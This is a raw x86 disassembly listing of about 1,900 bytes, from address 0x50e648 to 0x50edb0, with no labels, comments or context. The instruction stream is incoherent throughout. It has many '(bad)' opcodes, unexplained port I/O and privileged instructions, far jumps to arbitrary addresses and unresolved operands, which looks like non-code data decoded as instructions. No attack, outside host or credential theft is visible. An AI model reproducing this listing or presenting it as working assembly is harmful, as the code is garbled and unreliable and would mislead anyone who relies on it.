  50e648:	cmp    eax,0x4a02a9d5
  50e64d:	dec    esi
  50e64e:	sub    DWORD PTR [ebx],0x6
  50e651:	jmp    0x50e663
  50e653:	ja     0x50e6ad
  50e655:	test   eax,0x178c874d
  50e65a:	dec    esp
  50e65b:	lock outs dx,BYTE PTR ds:[esi]
  50e65d:	arpl   WORD PTR [ecx],dx
  50e65f:	push   ds
  50e660:	mov    WORD PTR [ebx+ecx*4],ss
  50e663:	stos   DWORD PTR es:[edi],eax
  50e664:	xchg   ebp,eax
  50e665:	xor    BYTE PTR [edx+0x6b],dl
  50e668:	push   ds
  50e669:	test   al,0x4a
  50e66b:	mov    BYTE PTR [esi+ebx*8+0x30],ah
  50e66f:	pop    ebp
  50e670:	out    0xf7,eax
  50e672:	dec    eax
  50e673:	pop    eax
  50e674:	(bad)  
  50e675:	xor    edx,DWORD PTR [esi]
  50e677:	dec    esi
  50e678:	xchg   esi,eax
  50e679:	std    
  50e67a:	and    DWORD PTR [edx+0x899cbdb],edi
  50e680:	ins    BYTE PTR es:[edi],dx
  50e681:	sub    al,0x9f
  50e683:	dec    ebx
  50e684:	ficomp WORD PTR [ecx]
  50e686:	push   edx
  50e687:	mov    esp,0x12556001
  50e68c:	psllq  mm0,QWORD PTR [edx+0x6]
  50e690:	jb     0x50e6d8
  50e692:	mov    ds:0xff0637dc,eax
  50e697:	push   cs
  50e698:	std    
  50e699:	inc    ebx
  50e69a:	mov    al,ds:0x2c142185
  50e69f:	sub    BYTE PTR [ebx+0x40],dh
  50e6a2:	pop    ss
  50e6a3:	icebp  
  50e6a4:	push   esp
  50e6a5:	xchg   ebx,eax
  50e6a6:	mov    ecx,ebp
  50e6a8:	cli    
  50e6a9:	pop    edi
  50e6aa:	push   eax
  50e6ab:	xchg   esi,eax
  50e6ac:	xlat   BYTE PTR ds:[ebx]
  50e6ad:	jp     0x50e6b6
  50e6af:	pop    edx
  50e6b0:	sti    
  50e6b1:	stos   DWORD PTR es:[edi],eax
  50e6b2:	ret    
  50e6b3:	dec    esi
  50e6b4:	call   0x2de61be7
  50e6b9:	inc    esi
  50e6ba:	fld    DWORD PTR [ebx]
  50e6bc:	mov    dh,0xc8
  50e6be:	out    0x63,al
  50e6c0:	inc    ebx
  50e6c1:	imul   ebp,DWORD PTR [esi+edx*1+0x4fbc624b],0xffffff8d
  50e6c9:	or     eax,0x2ca795c4
  50e6ce:	out    0xc6,al
  50e6d0:	ret    
  50e6d1:	lods   eax,DWORD PTR ds:[esi]
  50e6d2:	xlat   BYTE PTR ds:[ebx]
  50e6d3:	shl    BYTE PTR [edx],cl
  50e6d5:	jecxz  0x50e680
  50e6d7:	pop    es
  50e6d8:	xchg   edi,eax
  50e6d9:	mov    al,0x1a
  50e6db:	sub    al,0xba
  50e6dd:	pop    edi
  50e6de:	sub    BYTE PTR [eax+0x11],bh
  50e6e1:	mov    ebx,0x9d176a64
  50e6e6:	xor    eax,0xc4dab661
  50e6eb:	or     dl,BYTE PTR [ecx]
  50e6ed:	rcl    DWORD PTR [edi+0x2],1
  50e6f0:	push   0xfffffff6
  50e6f2:	jns    0x50e6b9
  50e6f4:	xchg   BYTE PTR [ecx-0x19d5c1f0],cl
  50e6fa:	bound  ecx,QWORD PTR [edx-0x7288c996]
  50e700:	jb     0x50e74b
  50e702:	sub    DWORD PTR [edi+ecx*4],esp
  50e705:	dec    ebp
  50e706:	loop   0x50e6c2
  50e708:	(bad)  
  50e709:	xchg   edi,eax
  50e70a:	rol    BYTE PTR [ebp-0x2],cl
  50e70d:	aad    0xe5
  50e70f:	fwait
  50e710:	push   ecx
  50e711:	mov    eax,ds:0x8936da93
  50e716:	push   ds
  50e717:	mov    esp,DWORD PTR [eax]
  50e719:	arpl   WORD PTR [edx+0x5a],bp
  50e71c:	mov    esi,0x10c720ca
  50e721:	clc    
  50e722:	outs   dx,BYTE PTR ds:[esi]
  50e723:	dec    esp
  50e724:	mov    cl,0xe9
  50e726:	push   ecx
  50e727:	dec    edx
  50e728:	lods   al,BYTE PTR ds:[esi]
  50e729:	faddp  st(5),st
  50e72b:	fs out dx,al
  50e72d:	in     al,0x8b
  50e72f:	call   0x5a44aea1
  50e734:	jno    0x50e732
  50e736:	xor    DWORD PTR [edx],ecx
  50e738:	mov    eax,ds:0x20763a09
  50e73d:	sub    DWORD PTR [ecx+0x42f6fcc2],ecx
  50e743:	mov    eax,0xb2716bb1
  50e748:	stos   DWORD PTR es:[edi],eax
  50e749:	add    eax,0x249eec9a
  50e74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e74f:	(bad)  
  50e750:	cld    
  50e751:	lods   al,BYTE PTR ds:[esi]
  50e752:	ins    DWORD PTR es:[edi],dx
  50e753:	shl    DWORD PTR [esi-0x4f],cl
  50e756:	fsub   st,st(5)
  50e758:	aam    0xdb
  50e75a:	adc    ah,BYTE PTR [ecx+0x59]
  50e75d:	jp     0x50e790
  50e75f:	jns    0x50e757
  50e761:	test   eax,0xb75f3db8
  50e766:	push   ss
  50e767:	fimul  DWORD PTR [ecx]
  50e769:	stc    
  50e76a:	into   
  50e76b:	cmp    ebp,DWORD PTR [esi]
  50e76d:	cmc    
  50e76e:	or     edx,edi
  50e770:	jne    0x50e753
  50e772:	xchg   esp,eax
  50e773:	stc    
  50e774:	ud2    
  50e776:	cwde   
  50e777:	or     eax,0x469fca63
  50e77d:	mov    al,ah
  50e77f:	(bad)  
  50e780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e781:	mov    ebx,0x1f63aac7
  50e786:	pop    esi
  50e787:	imul   ebx,DWORD PTR [esi+0x539cf261],0x28612479
  50e791:	fimul  DWORD PTR [edi-0x19861ae5]
  50e797:	xor    ch,ch
  50e799:	mov    dh,0x8e
  50e79b:	mov    ebx,0xfc73b13b
  50e7a0:	je     0x50e806
  50e7a2:	mov    edx,0xb02f792a
  50e7a7:	mov    ecx,ecx
  50e7a9:	add    bh,bl
  50e7ab:	pop    es
  50e7ac:	push   esi
  50e7ad:	jmp    0x10ed5b7c
  50e7b2:	sub    eax,0xa059812b
  50e7b7:	jecxz  0x50e800
  50e7b9:	repnz lock inc edi
  50e7bc:	cmp    eax,0xb8121ce7
  50e7c1:	jo     0x50e7b7
  50e7c3:	or     eax,0xdfe37d15
  50e7c8:	xchg   edx,eax
  50e7c9:	xchg   ebx,eax
  50e7ca:	leave  
  50e7cb:	mov    ebx,0x70e2fd38
  50e7d0:	out    dx,al
  50e7d1:	std    
  50e7d2:	sbb    ch,dh
  50e7d4:	inc    ebx
  50e7d5:	or     ah,BYTE PTR [eax]
  50e7d7:	aas    
  50e7d8:	nop
  50e7d9:	mov    ebp,0xb5409a4c
  50e7de:	pop    es
  50e7df:	mov    DWORD PTR [ebx+edi*1-0x3e8f2271],esp
  50e7e6:	sbb    dl,BYTE PTR [esi-0x6d]
  50e7e9:	ret    
  50e7ea:	pop    edi
  50e7eb:	int3   
  50e7ec:	(bad)  
  50e7ee:	out    dx,eax
  50e7ef:	mov    edx,ss
  50e7f1:	add    BYTE PTR [ebx-0x6745ba9e],ch
  50e7f7:	psubusb mm4,QWORD PTR [edi+ecx*8+0x5a]
  50e7fc:	(bad)  
  50e7fe:	call   0xb8f9:0x3702901a
  50e805:	xor    al,0x8
  50e807:	or     al,0xb5
  50e809:	xchg   esp,eax
  50e80a:	cli    
  50e80b:	retf   0xccb7
  50e80e:	cld    
  50e80f:	xor    al,0x58
  50e811:	cmc    
  50e812:	xor    eax,0xcb94713c
  50e817:	or     bh,bh
  50e819:	adc    DWORD PTR [edx+0x37],0xc14c6ef4
  50e820:	cmp    eax,0xe03c9438
  50e825:	cmp    dl,cl
  50e827:	loop   0x50e891
  50e829:	stos   DWORD PTR es:[edi],eax
  50e82a:	sahf   
  50e82b:	loope  0x50e80d
  50e82d:	aas    
  50e82e:	mov    edi,ss
  50e830:	stc    
  50e831:	cli    
  50e832:	test   DWORD PTR [bx-0x5abe],eax
  50e837:	push   eax
  50e838:	ds xor eax,0x384200f8
  50e83e:	ins    BYTE PTR es:[edi],dx
  50e83f:	mov    ds:0xede7c6a8,al
  50e844:	pop    ds
  50e845:	xchg   esi,eax
  50e846:	mov    al,ds:0x264f7ff4
  50e84b:	jecxz  0x50e805
  50e84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e84e:	inc    ebx
  50e84f:	iret   
  50e850:	sub    edx,DWORD PTR [edi]
  50e852:	(bad)  
  50e853:	je     0x50e82b
  50e855:	inc    edx
  50e856:	ja     0x50e7df
  50e858:	leave  
  50e859:	push   ds
  50e85a:	imul   esi,DWORD PTR [ebx-0x75],0xce95f756
  50e861:	(bad)  
  50e862:	mov    eax,ds:0x1d217907
  50e867:	pop    es
  50e868:	add    ah,BYTE PTR [ebp-0x64d2a599]
  50e86e:	cmp    ah,ah
  50e870:	adc    al,BYTE PTR cs:[edi+0x4e35dcbf]
  50e877:	lahf   
  50e878:	fs popa 
  50e87a:	xchg   ebp,eax
  50e87b:	and    DWORD PTR [eax],esp
  50e87d:	imul   eax,esp,0x5f
  50e880:	push   ebp
  50e881:	adc    al,0x1a
  50e883:	jnp    0x50e8a9
  50e885:	cwde   
  50e886:	std    
  50e887:	es pop ecx
  50e889:	sub    al,0xbb
  50e88b:	push   edx
  50e88c:	sbb    DWORD PTR [eax],ebx
  50e88e:	pop    esi
  50e88f:	jge    0x50e900
  50e891:	jae    0x50e88f
  50e893:	pop    esp
  50e894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50e895:	mov    eax,?
  50e897:	lods   al,BYTE PTR ds:[esi]
  50e898:	loope  0x50e901
  50e89a:	data16 int3 
  50e89c:	xchg   DWORD PTR [edi],ebp
  50e89e:	and    al,0x4
  50e8a0:	popf   
  50e8a1:	adc    eax,0x8c29f1c0
  50e8a6:	add    DWORD PTR [esp+ebp*2+0x631b1288],esp
  50e8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e8ae:	xor    bh,BYTE PTR [ebx]
  50e8b0:	mov    ebx,0x57252fbb
  50e8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e8b6:	sar    BYTE PTR [ebp-0xb],0x24
  50e8ba:	nop
  50e8bb:	push   es
  50e8bc:	inc    esp
  50e8bd:	add    DWORD PTR [eax-0x5a996ffa],edi
  50e8c3:	(bad)  
  50e8c4:	call   0x35f90067
  50e8c9:	test   al,0x7c
  50e8cb:	jnp    0x50e931
  50e8cd:	xor    eax,0xf0b9fbad
  50e8d2:	add    eax,0xed08fd69
  50e8d7:	inc    ebx
  50e8d8:	dec    eax
  50e8d9:	jne    0x50e903
  50e8db:	push   esp
  50e8dc:	mov    eax,0xe1ef5a03
  50e8e1:	mov    eax,0xd39610c0
  50e8e6:	cmp    eax,0xb2ef8dcc
  50e8eb:	inc    BYTE PTR [edx*1-0x4aba3d75]
  50e8f2:	pop    ebx
  50e8f3:	sar    dl,0x16
  50e8f6:	fldenv [bp+si]
  50e8f9:	sub    al,0x23
  50e8fb:	in     al,0x18
  50e8fd:	cdq    
  50e8fe:	or     edi,ebx
  50e900:	hlt    
  50e901:	xor    BYTE PTR [eax+0x3c],dl
  50e904:	retf   
  50e905:	push   esp
  50e906:	xchg   ebp,eax
  50e907:	mov    edx,0xc136573b
  50e90c:	out    dx,eax
  50e90d:	nop
  50e90e:	add    BYTE PTR [ebx-0x6a8c529d],ah
  50e914:	scas   al,BYTE PTR es:[edi]
  50e915:	mov    al,BYTE PTR [esi+0x1]
  50e918:	sti    
  50e919:	push   cs
  50e91a:	cmp    BYTE PTR [ebx-0x40],0x3c
  50e91e:	xchg   edx,eax
  50e91f:	lock (bad) 
  50e921:	leave  
  50e922:	push   ds
  50e923:	mov    esi,0x6f2fb058
  50e928:	cwde   
  50e929:	popf   
  50e92a:	dec    ebx
  50e92b:	mov    ebp,0x1d820f9d
  50e930:	cdq    
  50e931:	addr16 in eax,dx
  50e933:	mov    ebx,?
  50e935:	fist   DWORD PTR [edx]
  50e937:	scas   al,BYTE PTR es:[edi]
  50e938:	mov    ds:0x20b239c9,eax
  50e93d:	jb     0x50e8bf
  50e93f:	xchg   ecx,eax
  50e940:	frstor [ecx-0x3a24330f]
  50e946:	jl     0x50e8cb
  50e948:	xchg   esi,eax
  50e949:	dec    esi
  50e94a:	sbb    DWORD PTR [ecx],esi
  50e94c:	scas   al,BYTE PTR es:[edi]
  50e94d:	push   ss
  50e94e:	inc    esi
  50e94f:	cmc    
  50e950:	mov    DWORD PTR [edi+0x15],0xe8a0cbdd
  50e957:	fiadd  DWORD PTR [ebx+esi*1]
  50e95a:	std    
  50e95b:	jle    0x50e981
  50e95d:	pop    ss
  50e95e:	fbstp  TBYTE PTR [eax-0x19]
  50e961:	repnz bound edi,QWORD PTR [edx+0x28]
  50e965:	cmp    ebp,DWORD PTR [eax+eiz*2-0x67]
  50e969:	dec    edx
  50e96a:	add    ecx,DWORD PTR [edi+0x55]
  50e96d:	rcl    DWORD PTR [edi],1
  50e96f:	dec    edx
  50e970:	jmp    0x263c:0xcda13dee
  50e977:	ins    DWORD PTR es:[edi],dx
  50e978:	retf   0x584a
  50e97b:	les    edi,FWORD PTR ds:[eax-0x6a]
  50e97f:	or     eax,0x866c6821
  50e984:	(bad)  
  50e986:	fild   QWORD PTR [ebx-0x52db8bed]
  50e98c:	cmp    DWORD PTR [esp+esi*8-0xe],ecx
  50e990:	mov    ds:0x8d601bef,al
  50e995:	call   0x257f:0x63596106
  50e99c:	mov    edi,0xf1aad801
  50e9a2:	test   al,0xf0
  50e9a4:	push   ebx
  50e9a5:	push   ebp
  50e9a6:	sub    eax,0xfb045e6b
  50e9ab:	inc    ebp
  50e9ac:	ss mov cl,0x5d
  50e9af:	outs   dx,BYTE PTR ds:[esi]
  50e9b0:	jl     0x50e933
  50e9b2:	jo     0x50ea2c
  50e9b4:	sti    
  50e9b5:	imul   eax,DWORD PTR [ebx+0x7a],0xffffffdf
  50e9b9:	bound  edi,QWORD PTR [esi-0x7f]
  50e9bc:	jnp    0x50ea38
  50e9be:	faddp  st(5),st
  50e9c0:	mov    edi,DWORD PTR [edx+0x74]
  50e9c3:	es scas eax,DWORD PTR es:[edi]
  50e9c5:	sub    BYTE PTR [edi-0x2cd58395],0x1e
  50e9cc:	inc    ebx
  50e9cd:	adc    eax,0xf81c04af
  50e9d2:	pop    es
  50e9d3:	lods   eax,DWORD PTR ds:[esi]
  50e9d4:	dec    esi
  50e9d5:	pop    ebp
  50e9d6:	in     eax,0xa5
  50e9d8:	(bad)  
  50e9d9:	mov    ebx,eax
  50e9db:	add    BYTE PTR [eax+0x4d2b88f],0xaa
  50e9e2:	call   FWORD PTR [ecx+ecx*2-0x7b36a205]
  50e9e9:	xchg   edx,eax
  50e9ea:	mov    ch,0x5c
  50e9ec:	cdq    
  50e9ed:	ds cld 
  50e9ef:	out    dx,al
  50e9f0:	sahf   
  50e9f1:	les    esi,FWORD PTR [edi+esi*8+0x38]
  50e9f5:	bound  ecx,QWORD PTR [esi-0x3d]
  50e9f8:	(bad)
  50e9fc:	or     ecx,DWORD PTR [ecx-0x40]
  50e9ff:	fnstsw WORD PTR [edx+0x12dd9f9]
  50ea05:	stc    
  50ea06:	add    ecx,DWORD PTR [edi-0x6384d1be]
  50ea0c:	push   0x16075d55
  50ea11:	imul   edx,ebp,0xffffffa5
  50ea14:	add    ebp,esp
  50ea16:	jno    0x50ea22
  50ea18:	pop    edx
  50ea19:	mov    al,0x6c
  50ea1b:	xchg   ebp,eax
  50ea1c:	cli    
  50ea1d:	xor    al,0x7
  50ea1f:	psubusb mm5,QWORD PTR [edi]
  50ea22:	fsub   QWORD PTR [edx-0x69144b0a]
  50ea28:	int3   
  50ea29:	cmp    BYTE PTR ds:0x8179ce6f,bl
  50ea2f:	sbb    eax,0xe15c716f
  50ea34:	aam    0xdc
  50ea36:	xchg   esi,eax
  50ea37:	xchg   edx,eax
  50ea38:	cmp    cl,BYTE PTR [ebx-0x3feb149a]
  50ea3e:	cwde   
  50ea3f:	sub    eax,0x66edc9a2
  50ea44:	std    
  50ea45:	xor    BYTE PTR [ebp+0x73],ah
  50ea48:	dec    edi
  50ea49:	add    eax,0xefd4d9dd
  50ea4e:	lock xchg esi,eax
  50ea50:	in     al,0x2a
  50ea52:	fwait
  50ea53:	mov    ah,0xa5
  50ea55:	shl    ecx,1
  50ea57:	bound  edx,QWORD PTR [edx+0x3]
  50ea5a:	and    BYTE PTR [ebx-0x3abcdb1a],ch
  50ea60:	jae    0x50eab5
  50ea62:	bound  eax,QWORD PTR [edi-0x5d]
  50ea65:	xor    ebx,DWORD PTR ds:0x3c195655
  50ea6b:	pop    edx
  50ea6c:	dec    esi
  50ea6d:	clc    
  50ea6e:	sub    al,0x66
  50ea70:	bound  ecx,QWORD PTR [ebp-0x58]
  50ea73:	mov    ah,ch
  50ea75:	jmp    0x50ea42
  50ea77:	add    bl,BYTE PTR [eax]
  50ea79:	aas    
  50ea7a:	jb     0x50ea04
  50ea7c:	inc    esp
  50ea7d:	sub    dh,ch
  50ea7f:	(bad)  
  50ea80:	push   ecx
  50ea81:	adc    bh,bl
  50ea83:	sub    esi,ecx
  50ea85:	or     eax,0x54ab925c
  50ea8a:	(bad)  
  50ea8b:	sbb    al,0x40
  50ea8d:	jne    0x50eb05
  50ea8f:	out    0xc3,eax
  50ea91:	cmp    ah,BYTE PTR [eax-0x6d]
  50ea94:	sub    ah,bh
  50ea96:	xchg   ebx,eax
  50ea97:	(bad)  
  50ea98:	push   cs
  50ea99:	and    al,0x40
  50ea9b:	jg     0x50ea56
  50ea9d:	out    0x48,al
  50ea9f:	popa   
  50eaa0:	mov    al,0x2c
  50eaa2:	lea    ebx,ds:0xca66575e
  50eaa8:	test   al,0x83
  50eaaa:	rcl    WORD PTR [ebx],cl
  50eaad:	add    eax,0x29dab73c
  50eab2:	push   ss
  50eab3:	cmc    
  50eab4:	and    ebp,edi
  50eab6:	popf   
  50eab7:	xlat   BYTE PTR ds:[ebx]
  50eab8:	inc    ebx
  50eab9:	test   eax,0x3bdf40da
  50eabe:	stos   BYTE PTR es:[edi],al
  50eabf:	push   eax
  50eac0:	pop    ss
  50eac1:	cmc    
  50eac2:	inc    edx
  50eac3:	in     eax,dx
  50eac4:	adc    al,0xf6
  50eac6:	shl    DWORD PTR [eax-0xb],1
  50eac9:	jmp    0x92d22eb6
  50eace:	pop    ebp
  50eacf:	sbb    BYTE PTR [esi-0x2b31fc1b],0x5d
  50ead6:	jne    0x50eb00
  50ead8:	add    al,0x51
  50eada:	mov    bh,0x22
  50eadc:	ss pop ebp
  50eade:	(bad)  [ebp+0x59d2f705]
  50eae4:	outs   dx,BYTE PTR ds:[esi]
  50eae5:	sub    ebx,ecx
  50eae7:	test   BYTE PTR [eax],0x31
  50eaea:	pop    eax
  50eaeb:	jle    0x50eb2d
  50eaed:	mov    edi,0x300bffd8
  50eaf2:	push   ss
  50eaf3:	xchg   esp,eax
  50eaf4:	call   0xaa28:0x61a73139
  50eafb:	push   esp
  50eafc:	pop    edi
  50eafd:	sbb    esi,ebx
  50eaff:	sub    bh,BYTE PTR [esi]
  50eb01:	pop    es
  50eb02:	in     eax,0x6a
  50eb04:	xlat   BYTE PTR ds:[ebx]
  50eb05:	mov    eax,0xf7d03f39
  50eb0a:	repnz aaa 
  50eb0c:	xchg   esp,eax
  50eb0d:	ret    0x4ae8
  50eb10:	mov    edx,0x4807e46e
  50eb15:	jmp    FWORD PTR [eax-0x12]
  50eb18:	mov    ch,0x4b
  50eb1a:	mov    esp,0x135b9a5
  50eb1f:	imul   edx,DWORD PTR [ecx+0x64],0x2a3ec82a
  50eb26:	rcl    DWORD PTR ds:0xe9cd2343,1
  50eb2c:	xchg   edi,eax
  50eb2d:	jmp    0x50eabc
  50eb2f:	pushf  
  50eb30:	jbe    0x50eb7b
  50eb32:	mov    edi,0x4d954c9b
  50eb37:	push   0x8e4c0d40
  50eb3c:	ss adc al,0x11
  50eb3f:	aaa    
  50eb40:	cmp    DWORD PTR [esi],ecx
  50eb42:	jae    0x50eb05
  50eb44:	out    0xec,al
  50eb46:	or     DWORD PTR ss:[bp+di-0x3da0],ebp
  50eb4c:	daa    
  50eb4d:	inc    edx
  50eb4e:	inc    ebp
  50eb4f:	jo     0x50eb01
  50eb51:	js     0x50eb28
  50eb53:	in     eax,dx
  50eb54:	aaa    
  50eb55:	stos   BYTE PTR es:[edi],al
  50eb56:	mov    BYTE PTR [edx-0x20],bh
  50eb59:	jb     0x50eb17
  50eb5b:	shr    edi,cl
  50eb5d:	sahf   
  50eb5e:	mov    ebx,0x2117dca9
  50eb63:	sub    ah,BYTE PTR [edi]
  50eb65:	leave  
  50eb66:	retf   0xb2f0
  50eb69:	fdiv   QWORD PTR [edi+esi*8-0x51]
  50eb6d:	into   
  50eb6e:	mov    esi,DWORD PTR [edi]
  50eb70:	sub    al,0x61
  50eb72:	daa    
  50eb73:	aad    0xdc
  50eb75:	xchg   esp,eax
  50eb76:	test   DWORD PTR [ecx],ebx
  50eb78:	fwait
  50eb79:	adc    BYTE PTR [esi],ah
  50eb7b:	xchg   edx,eax
  50eb7c:	mov    ch,0xf0
  50eb7e:	mov    esi,DWORD PTR [eax-0x40]
  50eb81:	push   es
  50eb82:	inc    ecx
  50eb83:	icebp  
  50eb84:	ins    BYTE PTR es:[edi],dx
  50eb85:	sub    al,0x94
  50eb87:	mov    dl,BYTE PTR [ecx-0x39ebf2bf]
  50eb8d:	mov    eax,0x8f312d88
  50eb92:	add    al,0x42
  50eb94:	ja     0x50eb81
  50eb96:	sbb    eax,0xe3ebc4df
  50eb9b:	mul    DWORD PTR [esi+0x18f144a7]
  50eba1:	xor    BYTE PTR [ebx+0x608e41c0],bl
  50eba7:	fs retf 
  50eba9:	sub    eax,0x2d5a93bd
  50ebae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50ebaf:	loope  0x50ebfd
  50ebb1:	mov    al,0x16
  50ebb3:	out    0x9c,al
  50ebb5:	push   esi
  50ebb6:	xchg   ebp,eax
  50ebb7:	(bad)  
  50ebb8:	repnz push ecx
  50ebba:	adc    DWORD PTR [esi+0x6c047dbc],esi
  50ebc0:	pop    ebx
  50ebc1:	in     al,0x6f
  50ebc3:	leave  
  50ebc4:	or     esi,edx
  50ebc6:	and    eax,0x8dcfdcf2
  50ebcb:	(bad)  
  50ebcc:	fidiv  DWORD PTR [eax]
  50ebce:	popa   
  50ebcf:	mov    al,ds:0xb2b7acec
  50ebd4:	addr16 in al,dx
  50ebd6:	(bad)  
  50ebd7:	push   ecx
  50ebd8:	call   0x4841e44e
  50ebdd:	xchg   esi,eax
  50ebde:	mov    ecx,0x123d3326
  50ebe3:	mov    dl,0xf4
  50ebe5:	xchg   esp,eax
  50ebe6:	test   DWORD PTR [eax-0x1d],ebx
  50ebe9:	xchg   esp,eax
  50ebea:	jns    0x50ec14
  50ebec:	hlt    
  50ebed:	cld    
  50ebee:	mov    ecx,0x194490a5
  50ebf3:	mov    ebp,0xed110150
  50ebf8:	loope  0x50ec48
  50ebfa:	adc    DWORD PTR [ecx-0x64],esi
  50ebfd:	jg     0x50ec61
  50ebff:	jae    0x50ebd0
  50ec01:	mov    DWORD PTR [ecx-0x1eb2cef6],edx
  50ec07:	cmc    
  50ec08:	jg     0x50ec52
  50ec0a:	cs pop ds
  50ec0c:	jecxz  0x50ebf3
  50ec0e:	lea    ebx,[edi+0x25]
  50ec11:	jne    0x50ec4b
  50ec13:	and    BYTE PTR [edi],ch
  50ec15:	frstor [ecx+0xb7d5078]
  50ec1b:	in     eax,dx
  50ec1c:	outs   dx,DWORD PTR ds:[esi]
  50ec1d:	retf   0xbb25
  50ec20:	ret    0xb453
  50ec23:	fiadd  DWORD PTR [edx+0x4eea3f5a]
  50ec29:	das    
  50ec2a:	mov    WORD PTR [ebx],ds
  50ec2c:	bnd jno 0x50ebff
  50ec2f:	popa   
  50ec30:	add    ebp,ecx
  50ec32:	stc    
  50ec33:	dec    ebp
  50ec34:	mov    ecx,0xd14f722a
  50ec39:	push   esi
  50ec3a:	cmp    BYTE PTR [esp+ebx*1+0x3b8fca6e],0x45
  50ec42:	jp     0x50ec64
  50ec44:	mov    bl,bh
  50ec46:	push   es
  50ec47:	inc    ebp
  50ec48:	jmp    0xf7a372a3
  50ec4d:	mov    dh,0x88
  50ec4f:	shl    DWORD PTR [edi+0x336a020],1
  50ec55:	gs pop esp
  50ec57:	adc    ebx,DWORD PTR [esi+edi*1]
  50ec5a:	cmp    bh,dl
  50ec5c:	sub    ecx,DWORD PTR [esi+0x3408b169]
  50ec62:	push   0x72
  50ec64:	repnz mov bh,0x66
  50ec67:	xchg   DWORD PTR [ebp-0x24258d28],ecx
  50ec6d:	add    al,0xe0
  50ec6f:	pop    ss
  50ec70:	fwait
  50ec71:	xchg   DWORD PTR [ebp+0x3e2aa02],ebp
  50ec77:	dec    eax
  50ec78:	test   eax,0xd64defc6
  50ec7d:	stos   DWORD PTR es:[edi],eax
  50ec7e:	mov    bh,0xe7
  50ec80:	pop    edi
  50ec81:	(bad)  
  50ec82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50ec83:	xor    DWORD PTR [esi],ebx
  50ec85:	adc    eax,0x5ea50ae3
  50ec8a:	test   ecx,0xc9f09a0a
  50ec90:	and    eax,0x409a3e10
  50ec95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50ec96:	lds    edx,FWORD PTR ds:0x8ba01f70
  50ec9c:	or     DWORD PTR [ebx-0xb],0xe8b752a5
  50eca3:	or     dh,BYTE PTR [edi]
  50eca5:	jbe    0x50ec66
  50eca7:	mov    eax,0x78d5569c
  50ecac:	lahf   
  50ecad:	leave  
  50ecae:	out    0xaf,eax
  50ecb0:	into   
  50ecb1:	cmp    cl,BYTE PTR [edi]
  50ecb3:	adc    ecx,ecx
  50ecb5:	call   0xc6ebc4fc
  50ecba:	lahf   
  50ecbb:	jb     0x50ecf8
  50ecbd:	cmp    al,0x61
  50ecbf:	daa    
  50ecc0:	leave  
  50ecc1:	sbb    al,BYTE PTR ds:0xa7316792
  50ecc7:	test   eax,0x734b3cac
  50eccc:	xor    al,0xc0
  50ecce:	xor    BYTE PTR [edi],cl
  50ecd0:	inc    ecx
  50ecd1:	xchg   BYTE PTR [ebx-0x779defa4],ch
  50ecd7:	outs   dx,BYTE PTR ds:[esi]
  50ecd8:	adc    al,0x28
  50ecda:	xchg   ecx,eax
  50ecdb:	adc    ebx,DWORD PTR [eax]
  50ecdd:	sbb    edx,DWORD PTR [eax]
  50ecdf:	retf   0x7a5f
  50ece2:	add    BYTE PTR cs:[esi+edx*8],bh
  50ece6:	jle    0x50ecb8
  50ece8:	fsubr  st,st(5)
  50ecea:	arpl   ax,ax
  50ecec:	mov    esp,0xa1c573fa
  50ecf1:	cmp    eax,0xc608115e
  50ecf6:	xor    esp,DWORD PTR [ebp+0x3615d740]
  50ecfc:	pop    esp
  50ecfd:	aad    0x45
  50ecff:	sub    DWORD PTR [ecx-0x35],ebx
  50ed02:	push   eax
  50ed03:	call   0xd0b6:0x327cd7c3
  50ed0a:	xor    eax,0x93a24230
  50ed0f:	sub    ch,BYTE PTR [eax+0x13]
  50ed12:	pop    eax
  50ed13:	bound  ebx,QWORD PTR [esi-0x79]
  50ed16:	lods   eax,DWORD PTR ds:[esi]
  50ed17:	mov    cl,0x68
  50ed19:	test   ah,0x36
  50ed1c:	inc    ebp
  50ed1d:	loope  0x50ed42
  50ed1f:	cs ss adc esp,edi
  50ed23:	repz fild QWORD PTR ds:0x3a468cb8
  50ed2a:	sti    
  50ed2b:	sbb    BYTE PTR [eax+ecx*4-0x1ab110a1],0xc
  50ed33:	mov    ah,0x66
  50ed35:	lahf   
  50ed36:	mov    edi,0x3f2582be
  50ed3b:	imul   ebx,DWORD PTR [ebx+0x4f939feb],0xfffffff3
  50ed42:	stc    
  50ed43:	mov    ds,WORD PTR fs:[edi+edx*2-0x3]
  50ed48:	push   edi
  50ed49:	rcl    DWORD PTR [edx-0x4c],cl
  50ed4c:	dec    ebp
  50ed4d:	dec    edx
  50ed4e:	mov    ch,0x17
  50ed50:	lods   al,BYTE PTR ds:[esi]
  50ed51:	loop   0x50ed8a
  50ed53:	js     0x50ed07
  50ed55:	cmp    al,0x45
  50ed57:	push   cs
  50ed58:	test   ebp,eax
  50ed5a:	jns    0x50ed39
  50ed5c:	push   0xffffffa1
  50ed5e:	test   al,0x64
  50ed60:	add    BYTE PTR [edi],ah
  50ed62:	sub    al,0xf0
  50ed64:	sub    eax,0x474f28fd
  50ed69:	leave  
  50ed6a:	ds mov ebx,0x555e3e78
  50ed70:	gs push ss
  50ed72:	repz aam 0x4d
  50ed75:	test   BYTE PTR [ebx+0x53c4204a],ah
  50ed7b:	aas    
  50ed7c:	imul   bp,WORD PTR cs:[ebx],0xa181
  50ed82:	lods   eax,DWORD PTR ds:[esi]
  50ed83:	sti    
  50ed84:	jge    0x50ed0b
  50ed86:	pop    edx
  50ed87:	lahf   
  50ed88:	push   es
  50ed89:	add    DWORD PTR ds:0x1951702a,esp
  50ed8f:	mov    edx,0x76b81ac8
  50ed94:	mov    esp,0x98dce678
  50ed99:	mov    ds:0x1d648df4,al
  50ed9e:	bound  esp,QWORD PTR [edi]
  50eda0:	push   cs
  50eda1:	imul   al
  50eda3:	inc    ecx
  50eda4:	adc    edi,DWORD PTR [edi]
  50eda6:	push   edi
  50eda7:	aaa    
  50eda8:	(bad)  
  50eda9:	dec    edx
  50edaa:	jbe    0x50ed8f
  50edac:	shl    BYTE PTR [edx],cl
  50edae:	out    0xdc,al
  50edb0:	push   0x35
